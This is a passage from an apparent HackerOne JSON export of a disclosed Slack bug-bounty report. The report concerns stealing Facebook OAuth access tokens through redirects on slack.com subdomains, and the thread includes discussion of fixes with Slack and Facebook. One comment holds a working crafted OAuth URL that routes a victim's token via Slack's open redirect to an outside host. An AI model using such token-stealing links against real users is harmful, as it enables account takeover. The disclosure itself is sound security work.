{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2014-12-12T15:25:30.102Z", 
    "voters": [
        "axolotl", 
        "japz", 
        "spetr0x"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 6017, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Facebook Takeover using Slack using 302 from files.slack.com with access_token", 
    "is_member_of_team?": null, 
    "vote_count": 3, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2015-01-11T15:25:30.532Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$500", 
    "attachments": [
        {
            "file_name": "Screen_Shot_2014-04-06_at_09.16.07.png", 
            "type": "image/png", 
            "id": 5676, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/005/676/601efe008c11116f86e2ba1ed125a71125ca4c9d/Screen_Shot_2014-04-06_at_09.16.07.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHWOGSNR%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T230223Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEBAaDNyA%2BB7EVws6w20xiyK3AzcCTkx0GnZzVQ6TwXkp44%2Ff6M7%2FsO19EHzsTJXAjGqGadXUwBewmY%2FA3saLwd8Xt%2FLbqrBXnPVBmQqsNFRuZECDCBvLhSnrZ0V6VgN9XIGcsvjdqc1keY1F5jqudqF9DVlIY8TMvC8HZK%2B7Q1nt4NsrhczyPwsxABuLuXRQ9jz342kfr6jcg4V0RDeoTmkF41Ft6RtUq0hmoAqdCx1%2Fz70xB4R7l69zShPP7HLfYHPPTt8XR1Db%2BqWNJQckpie0NnlFKA6ZUTMDBoFCJMNlSMrC8fe4WfzeCwJzHJRBg8PuHWSmO%2BotEruefTqBjLBoXXi34gvMNLGz%2F2UMbXN0CJxslsSVQ1hVUGyCtMe0w9EsQpL39cO7khz0GcmiaRxiDS26USPGfQCc9lffeZFTxh4so1l02filHtFdYLVvAvgjiOYt2Mz5u6lBhccM0iI2WWXmcjR%2FS%2BkxYva3%2BrEYrii1%2BMbFzOhDKAxYvafuSoo%2BiLMqIErMru4lSMvT6Hdl0F7q6ar9ursg2xy2ld%2BSsM1Ffwx%2FIlTxlx%2Fk5K%2BKS4mgc5N3QgLYcjLnqKIjMyLCEr%2FVbmVxbtUo%2B7qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=709d70e64da1abff1afc95cfbe1543eac99376829de10a231214b0de37a70258"
        }, 
        {
            "file_name": "Screen_Shot_2014-04-06_at_09.16.24.png", 
            "type": "image/png", 
            "id": 5677, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/005/677/e42b905a334df5ec83ea0f31d1ae6b61bdefd3f7/Screen_Shot_2014-04-06_at_09.16.24.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHWOGSNR%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T230223Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEBAaDNyA%2BB7EVws6w20xiyK3AzcCTkx0GnZzVQ6TwXkp44%2Ff6M7%2FsO19EHzsTJXAjGqGadXUwBewmY%2FA3saLwd8Xt%2FLbqrBXnPVBmQqsNFRuZECDCBvLhSnrZ0V6VgN9XIGcsvjdqc1keY1F5jqudqF9DVlIY8TMvC8HZK%2B7Q1nt4NsrhczyPwsxABuLuXRQ9jz342kfr6jcg4V0RDeoTmkF41Ft6RtUq0hmoAqdCx1%2Fz70xB4R7l69zShPP7HLfYHPPTt8XR1Db%2BqWNJQckpie0NnlFKA6ZUTMDBoFCJMNlSMrC8fe4WfzeCwJzHJRBg8PuHWSmO%2BotEruefTqBjLBoXXi34gvMNLGz%2F2UMbXN0CJxslsSVQ1hVUGyCtMe0w9EsQpL39cO7khz0GcmiaRxiDS26USPGfQCc9lffeZFTxh4so1l02filHtFdYLVvAvgjiOYt2Mz5u6lBhccM0iI2WWXmcjR%2FS%2BkxYva3%2BrEYrii1%2BMbFzOhDKAxYvafuSoo%2BiLMqIErMru4lSMvT6Hdl0F7q6ar9ursg2xy2ld%2BSsM1Ffwx%2FIlTxlx%2Fk5K%2BKS4mgc5N3QgLYcjLnqKIjMyLCEr%2FVbmVxbtUo%2B7qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=de53b782ad3c35ff4480d094f092d2587b505a772f12e26a5e9c4d2a0c946d9a"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2014-04-06T07:36:30.479Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-04-06T07:36:30.479Z", 
            "actor": {
                "username": "fransrosen", 
                "url": "/fransrosen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/634/56528780ddde67dec2e6f9d1212879ab16bc8f4a_medium.jpg?1396468576"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Hi again,\n\nOne simple solution which I think would work is to modify the redirect from files.slack.com:\n\nlocation:https://slack-files.com/files-pri-safe/T025M9QPZ-F0283NJ20/hash.swf?c=1396769705-f034ef9e2f4301fd2dd339b9ac42dd7148c8effe\n\nSo it's actually will reset the hash:\n\nlocation:https://slack-files.com/files-pri-safe/T025M9QPZ-F0283NJ20/hash.swf?c=1396769705-f034ef9e2f4301fd2dd339b9ac42dd7148c8effe#_=_\n\nBut I guess that needs to be tested so it works, but that's a solution that would do so no access_token is transferred over to files.slack.com\n\nRegards,\nFrans", 
            "markdown_message": "<p>Hi again,</p>\n\n<p>One simple solution which I think would work is to modify the redirect from files.slack.com:</p>\n\n<p>location:<a title=\"https://slack-files.com/files-pri-safe/T025M9QPZ-F0283NJ20/hash.swf?c=1396769705-f034ef9e2f4301fd2dd339b9ac42dd7148c8effe\" href=\"/redirect?signature=ce0671bbd23a8828885c8448146f2fd2456cd6eb&amp;url=https%3A%2F%2Fslack-files.com%2Ffiles-pri-safe%2FT025M9QPZ-F0283NJ20%2Fhash.swf%3Fc%3D1396769705-f034ef9e2f4301fd2dd339b9ac42dd7148c8effe\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://slack-files.com/files-pri-safe/T025M9QPZ-F0283NJ20/hash.swf?c=1396769705-f034ef9e2f4301fd2dd339b9ac42dd7148c8effe</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>So it&#39;s actually will reset the hash:</p>\n\n<p>location:<a title=\"https://slack-files.com/files-pri-safe/T025M9QPZ-F0283NJ20/hash.swf?c=1396769705-f034ef9e2f4301fd2dd339b9ac42dd7148c8effe#_=_\" href=\"/redirect?signature=da86dbe7b6c2f3b79374051fb6535f8e33fecfe6&amp;url=https%3A%2F%2Fslack-files.com%2Ffiles-pri-safe%2FT025M9QPZ-F0283NJ20%2Fhash.swf%3Fc%3D1396769705-f034ef9e2f4301fd2dd339b9ac42dd7148c8effe%23_%3D_\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://slack-files.com/files-pri-safe/T025M9QPZ-F0283NJ20/hash.swf?c=1396769705-f034ef9e2f4301fd2dd339b9ac42dd7148c8effe#_=_</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>But I guess that needs to be tested so it works, but that&#39;s a solution that would do so no access_token is transferred over to files.slack.com</p>\n\n<p>Regards,<br>\nFrans</p>\n", 
            "type": "Activities::Comment", 
            "id": 24692, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-04-06T07:53:52.123Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-04-06T07:53:52.123Z", 
            "actor": {
                "username": "fransrosen", 
                "url": "/fransrosen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/634/56528780ddde67dec2e6f9d1212879ab16bc8f4a_medium.jpg?1396468576"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Here's some good info (some browsers did not support 302 with fragment in url):\nhttp://stackoverflow.com/a/2305927\n\n/F", 
            "markdown_message": "<p>Here&#39;s some good info (some browsers did not support 302 with fragment in url):<br>\n<a title=\"http://stackoverflow.com/a/2305927\" href=\"/redirect?signature=37a24906433fb58eca7795517e82853a41975361&amp;url=http%3A%2F%2Fstackoverflow.com%2Fa%2F2305927\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://stackoverflow.com/a/2305927</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>/F</p>\n", 
            "type": "Activities::Comment", 
            "id": 24696, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-04-07T18:13:33.257Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-04-07T18:13:33.257Z", 
            "actor": {
                "username": "iamcal", 
                "url": "/iamcal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/138/8791978ab70ce1b1e1b7a9c70e393fcd58ea85a0_medium.jpg?1393562983"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Good find. This one is tough to fix, since:\n\n* Facebook doesn't let you specify URLs *not* to allow\n* Facebook appears to always allow subdomains for OAuth\n* Browsers don't reliably allow stripping of fragments on redirect\n\nThis requires some investigation", 
            "markdown_message": "<p>Good find. This one is tough to fix, since:</p>\n\n<ul>\n<li>Facebook doesn&#39;t let you specify URLs <em>not</em> to allow</li>\n<li>Facebook appears to always allow subdomains for OAuth</li>\n<li>Browsers don&#39;t reliably allow stripping of fragments on redirect</li>\n</ul>\n\n<p>This requires some investigation</p>\n", 
            "type": "Activities::Comment", 
            "id": 25446, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-04-07T18:14:16.625Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-04-07T18:14:16.625Z", 
            "actor": {
                "username": "iamcal", 
                "url": "/iamcal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/138/8791978ab70ce1b1e1b7a9c70e393fcd58ea85a0_medium.jpg?1393562983"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugTriaged", 
            "id": 25448, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-04-24T22:34:25.663Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-04-24T22:34:25.663Z", 
            "actor": {
                "username": "fransrosen", 
                "url": "/fransrosen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/634/56528780ddde67dec2e6f9d1212879ab16bc8f4a_medium.jpg?1396468576"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Hey,\nNoticed that this was still vulnerable, I checked your list on the issues, and number 2 is actually fixable, you can force it to only allow one subdomain, like www.slack.com or something, and tunnel it through it, that would fix it. By setting the domain to slack.com only in Facebook will allow *.slack.com but setting it to www.slack.com will fix that.\n\nHope that helps,\n\nRegards,\nFrans", 
            "markdown_message": "<p>Hey,<br>\nNoticed that this was still vulnerable, I checked your list on the issues, and number 2 is actually fixable, you can force it to only allow one subdomain, like <a href=\"/redirect?signature=d50696058f3c5200e1417b0ce70049d29ccb06db&amp;url=http%3A%2F%2Fwww.slack.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>www.slack.com</span><i class=\"icon-external-link\"></i></a> or something, and tunnel it through it, that would fix it. By setting the domain to slack.com only in Facebook will allow *.slack.com but setting it to <a href=\"/redirect?signature=d50696058f3c5200e1417b0ce70049d29ccb06db&amp;url=http%3A%2F%2Fwww.slack.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>www.slack.com</span><i class=\"icon-external-link\"></i></a> will fix that.</p>\n\n<p>Hope that helps,</p>\n\n<p>Regards,<br>\nFrans</p>\n", 
            "type": "Activities::Comment", 
            "id": 38369, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-04-28T20:29:09.716Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-04-28T20:29:09.716Z", 
            "actor": {
                "username": "iamcal", 
                "url": "/iamcal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/138/8791978ab70ce1b1e1b7a9c70e393fcd58ea85a0_medium.jpg?1393562983"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Good idea for a fix - thanks", 
            "markdown_message": "<p>Good idea for a fix - thanks</p>\n", 
            "type": "Activities::Comment", 
            "id": 40748, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-05-15T14:07:15.705Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-05-15T14:07:15.705Z", 
            "actor": {
                "username": "fransrosen", 
                "url": "/fransrosen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/634/56528780ddde67dec2e6f9d1212879ab16bc8f4a_medium.jpg?1396468576"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Hi again,\n\nNoticed that there was a wontfix for the link?url=xxx on another report that was publicly posted yesterday, this however, makes my vulnerability above global for all users on Slack.\n\nhttps://www.facebook.com/dialog/oauth?client_id=569627156411038&redirect_uri=https%3A%2F%2Fslack.com%2Flink%3furl%3Dhttp%3A%2F%2Fwww.detectify.com&response_type=token&scope=user_photos&sdk=joey\n\nAs soon as someone using slack visits that link, token is sent to me. Game over... I would escalate to fix this issue much more now as the link-url is now publicly posted on the Wont-fix-report.\n\nCheers,\nFrans", 
            "markdown_message": "<p>Hi again,</p>\n\n<p>Noticed that there was a wontfix for the link?url=xxx on another report that was publicly posted yesterday, this however, makes my vulnerability above global for all users on Slack.</p>\n\n<p><a title=\"https://www.facebook.com/dialog/oauth?client_id=569627156411038&amp;redirect_uri=https%3A%2F%2Fslack.com%2Flink%3furl%3Dhttp%3A%2F%2Fwww.detectify.com&amp;response_type=token&amp;scope=user_photos&amp;sdk=joey\" href=\"/redirect?signature=10d7a4b76df470b0bc33c21c9cc7245b11421795&amp;url=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D569627156411038%26redirect_uri%3Dhttps%253A%252F%252Fslack.com%252Flink%253furl%253Dhttp%253A%252F%252Fwww.detectify.com%26response_type%3Dtoken%26scope%3Duser_photos%26sdk%3Djoey\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.facebook.com/dialog/oauth?client_id=569627156411038&amp;redirect_uri=https%3A%2F%2Fslack.com%2Flink%3furl%3Dhttp%3A%2F%2Fwww.detectify.com&amp;response_type=token&amp;scope=user_photos&amp;sdk=joey</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>As soon as someone using slack visits that link, token is sent to me. Game over... I would escalate to fix this issue much more now as the link-url is now publicly posted on the Wont-fix-report.</p>\n\n<p>Cheers,<br>\nFrans</p>\n", 
            "type": "Activities::Comment", 
            "id": 51640, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-05-16T22:00:49.286Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-05-16T22:00:49.286Z", 
            "actor": {
                "username": "iamcal", 
                "url": "/iamcal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/138/8791978ab70ce1b1e1b7a9c70e393fcd58ea85a0_medium.jpg?1393562983"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "I agree this is pretty high priority, but I can't figure out how to fix it. We never pass a redirect URI of any kind to Facebook - we're just using the JavaScript SDK and it's doing some secret black box magic. I can't find any documentation on how to configure this or if it's even possible. It looks like we might need to stop using the JavaScript SDK completely and move to a full manual OAuth flow.", 
            "markdown_message": "<p>I agree this is pretty high priority, but I can&#39;t figure out how to fix it. We never pass a redirect URI of any kind to Facebook - we&#39;re just using the JavaScript SDK and it&#39;s doing some secret black box magic. I can&#39;t find any documentation on how to configure this or if it&#39;s even possible. It looks like we might need to stop using the JavaScript SDK completely and move to a full manual OAuth flow.</p>\n", 
            "type": "Activities::Comment", 
            "id": 52587, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-05-20T20:57:01.063Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-05-20T20:57:01.063Z", 
            "actor": {
                "username": "fransrosen", 
                "url": "/fransrosen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/634/56528780ddde67dec2e6f9d1212879ab16bc8f4a_medium.jpg?1396468576"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Thanks for the info Cal, I've reported this to Facebook as I believe the combination of JS SDK and dynamic subdomains creates a non-patchable issue here, which does not makes sense. I suggested a solution where you're able to restrict your app to JS SDK only so the redirect_uri cannot be anything else than Facebooks xd_arbiter.js.\n\nWe'll see what happens there. I think the answer will be a Wontfix to them as the dynamic subdomains (which are added to the request since the page using the JS SDK is on *.slack.com) is the anti pattern according to Facebook. \n\nOne solution would be to host the Facebook-JS on //slack.com which are then utlized by *.slack.com, that would make it possible for you to add a whitelist-redirect_uri on //slack.com so nothing more than JS SDK and that redirect_uri (which then would be something like https://slack.com/404). But that would require you to move out the FB.init code to some sort of iframe-proxy or something, which is pretty ugly.\n\nAnyway, let's see what happens. I'll be in touch.\n\nRegards,\nFrans", 
            "markdown_message": "<p>Thanks for the info Cal, I&#39;ve reported this to Facebook as I believe the combination of JS SDK and dynamic subdomains creates a non-patchable issue here, which does not makes sense. I suggested a solution where you&#39;re able to restrict your app to JS SDK only so the redirect_uri cannot be anything else than Facebooks xd_arbiter.js.</p>\n\n<p>We&#39;ll see what happens there. I think the answer will be a Wontfix to them as the dynamic subdomains (which are added to the request since the page using the JS SDK is on *.slack.com) is the anti pattern according to Facebook. </p>\n\n<p>One solution would be to host the Facebook-JS on //slack.com which are then utlized by *.slack.com, that would make it possible for you to add a whitelist-redirect_uri on //slack.com so nothing more than JS SDK and that redirect_uri (which then would be something like <a title=\"https://slack.com/404\" href=\"/redirect?signature=12b27f46d955f8fed018c523a6ba974e6cdfc56b&amp;url=https%3A%2F%2Fslack.com%2F404\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://slack.com/404</span><i class=\"icon-external-link\"></i></a>). But that would require you to move out the FB.init code to some sort of iframe-proxy or something, which is pretty ugly.</p>\n\n<p>Anyway, let&#39;s see what happens. I&#39;ll be in touch.</p>\n\n<p>Regards,<br>\nFrans</p>\n", 
            "type": "Activities::Comment", 
            "id": 54337, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-05-20T23:08:58.512Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-05-20T23:08:58.512Z", 
            "actor": {
                "username": "iamcal", 
                "url": "/iamcal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/138/8791978ab70ce1b1e1b7a9c70e393fcd58ea85a0_medium.jpg?1393562983"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Thanks!", 
            "markdown_message": "<p>Thanks!</p>\n", 
            "type": "Activities::Comment", 
            "id": 54437, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-06-05T07:30:15.236Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-06-05T07:30:15.236Z", 
            "actor": {
                "username": "fransrosen", 
                "url": "/fransrosen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/634/56528780ddde67dec2e6f9d1212879ab16bc8f4a_medium.jpg?1396468576"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Hi Cal,\n\nI've got an answer from Facebook today, and it's the thing I believed should be the answer. TL;DR, you need to implement the real OAuth-flow when you're dealing with unlimited subdomains. The JS-SDK is impossible to secure when you do not have control over your subdomains.\n\nHere's their answer:\n\n> Hi Frans,\n> \n> The platform engineers I talked to agreed that the situation you laid out (using the JS SDK for a single app on unlimited subdomains without enabling other forms of client auth) isn't well-supported by our current set of configuration settings:\n> \n> - Turning off client-auth also turns off the JS SDK (since it uses an access token)\n> - As you pointed out, adding an explicit OAuth redirect URI works if you have a single domain or a known set of subdomains but not with an unlimited number.\n> \n> At this point there are not any plans to support keeping the JS SDK enabled while disabling other forms of client-auth. In cases where you need to support an unlimited number of subdomains, our recommendation is to use the explicit/code flow, which gives you more control over the application and its interaction with Facebook. You can define a single OAuth redirect endpoint and redirect from there to the appropriate subdomain-specific endpoint.\n> \n> Please let me know if you have any additional questions!\n> \n> Thanks,\n> \n> Neal\n> Security\n> Facebook\n\nRegards,\nFrans", 
            "markdown_message": "<p>Hi Cal,</p>\n\n<p>I&#39;ve got an answer from Facebook today, and it&#39;s the thing I believed should be the answer. TL;DR, you need to implement the real OAuth-flow when you&#39;re dealing with unlimited subdomains. The JS-SDK is impossible to secure when you do not have control over your subdomains.</p>\n\n<p>Here&#39;s their answer:</p>\n\n<blockquote>\n<p>Hi Frans,</p>\n\n<p>The platform engineers I talked to agreed that the situation you laid out (using the JS SDK for a single app on unlimited subdomains without enabling other forms of client auth) isn&#39;t well-supported by our current set of configuration settings:</p>\n\n<ul>\n<li>Turning off client-auth also turns off the JS SDK (since it uses an access token)</li>\n<li>As you pointed out, adding an explicit OAuth redirect URI works if you have a single domain or a known set of subdomains but not with an unlimited number.</li>\n</ul>\n\n<p>At this point there are not any plans to support keeping the JS SDK enabled while disabling other forms of client-auth. In cases where you need to support an unlimited number of subdomains, our recommendation is to use the explicit/code flow, which gives you more control over the application and its interaction with Facebook. You can define a single OAuth redirect endpoint and redirect from there to the appropriate subdomain-specific endpoint.</p>\n\n<p>Please let me know if you have any additional questions!</p>\n\n<p>Thanks,</p>\n\n<p>Neal<br>\nSecurity<br>\nFacebook</p>\n</blockquote>\n\n<p>Regards,<br>\nFrans</p>\n", 
            "type": "Activities::Comment", 
            "id": 67024, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-06-05T21:29:00.828Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-06-05T21:29:00.828Z", 
            "actor": {
                "username": "iamcal", 
                "url": "/iamcal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/138/8791978ab70ce1b1e1b7a9c70e393fcd58ea85a0_medium.jpg?1393562983"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Thanks for figuring this out!", 
            "markdown_message": "<p>Thanks for figuring this out!</p>\n", 
            "type": "Activities::Comment", 
            "id": 67559, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "fransrosen", 
                "url": "/fransrosen"
            }, 
            "created_at": "2014-12-12T05:40:23.994Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-12-12T05:40:23.994Z", 
            "actor": {
                "username": "rhuber", 
                "url": "/rhuber", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Thanks again for reporting this (and the followup). Much appreciated!", 
            "markdown_message": "<p>Thanks again for reporting this (and the followup). Much appreciated!</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 177122, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2014-12-12T05:41:08.266Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-12-12T05:41:08.266Z", 
            "actor": {
                "url": "/slack", 
                "profile": {
                    "name": "Slack"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/069/50cfd8e05b18bade214847ec5f61dcb9e6c85fa9_medium.png?1449082084"
                }
            }, 
            "team_handle": "slack", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "fransrosen", 
                "url": "/fransrosen"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 177123, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-12-12T07:45:58.540Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-12-12T07:45:58.540Z", 
            "actor": {
                "username": "fransrosen", 
                "url": "/fransrosen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/634/56528780ddde67dec2e6f9d1212879ab16bc8f4a_medium.jpg?1396468576"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Thanks! I believe you got a few dupes on this report during this time. :) Is it completely solved now? Would you mind if I make the report public?\nThanks again,\nFrans", 
            "markdown_message": "<p>Thanks! I believe you got a few dupes on this report during this time. :) Is it completely solved now? Would you mind if I make the report public?<br>\nThanks again,<br>\nFrans</p>\n", 
            "type": "Activities::Comment", 
            "id": 177149, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-12-12T15:25:30.117Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-12-12T15:25:30.117Z", 
            "actor": {
                "username": "fransrosen", 
                "url": "/fransrosen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/634/56528780ddde67dec2e6f9d1212879ab16bc8f4a_medium.jpg?1396468576"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 177331, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-01-11T15:25:45.604Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-01-11T15:25:45.604Z", 
            "actor": {
                "url": "/slack", 
                "profile": {
                    "name": "Slack"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/069/50cfd8e05b18bade214847ec5f61dcb9e6c85fa9_medium.png?1449082084"
                }
            }, 
            "team_handle": "slack", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 308432, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "fransrosen", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/fransrosen", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/001/634/6e02242b5d1d893cef698144faa706fd1d75fea0_small.jpg?1396468576"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 53, 
        "name": "Open Redirect"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -123147412.99965104, 
    "disclosed_at": "2015-01-11T15:25:45.229Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/6017", 
    "created_at": "2014-04-06T07:24:52.591Z", 
    "original_report_url": null, 
